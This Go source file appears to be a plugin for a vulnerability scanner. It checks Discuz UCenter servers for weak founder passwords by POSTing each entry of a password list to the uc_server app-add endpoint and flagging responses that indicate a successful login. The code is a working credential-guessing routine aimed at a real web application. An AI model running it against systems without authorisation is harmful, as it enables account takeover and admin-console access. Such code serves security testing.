package goplugin

import (
	"fmt"
	"net/http"
	"strings"
	"vuldb/common"
	"vuldb/plugin"
)

type ucServerWeak struct {
	info   common.PluginInfo
	result []common.PluginInfo
}

func init() {
	plugin.Regist("discuz", &ucServerWeak{})
}
func (d *ucServerWeak) Init() common.PluginInfo{
	d.info = common.PluginInfo{
		Name:    "UcServer 创始人弱口令",
		Remarks: "攻击者通过此漏洞可以登陆管理控制台，后台可查看修改所有用户信息，且部分版本可能存在命令执行漏洞。",
		Level:   0,
		Type:    "WEAK",
		Author:   "wolf",
		References: common.References{
			URL: "",
			CVE: "",
		},
	}
	return d.info
}
func (d *ucServerWeak) GetResult() []common.PluginInfo {
	return d.result
}
func (d *ucServerWeak) Check(URL string, meta plugin.TaskMeta) bool {
	for _, pass := range PassList {
		// pass = strings.Replace(pass, "{user}", "administrator", -1)
		request, err := http.NewRequest("POST", URL+"/uc_server/index.php?m=app&a=add", strings.NewReader("ucfounderpw="+pass))
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := common.RequestDo(request, true)
		if err != nil {
			return false
		}
		if resp.Other.StatusCode == 404 {
			return false
		}
		if strings.Contains(resp.ResponseRaw, "|") && resp.Other.ContentLength > 10 && resp.Other.ContentLength < 300 {
			result := d.info
			result.Response = resp.ResponseRaw
			result.Request = resp.RequestRaw
			result.Remarks = fmt.Sprintf("弱口令：%s,%s", pass, result.Remarks)
			d.result = append(d.result, result)
			return true
		}
	}
	return false
}
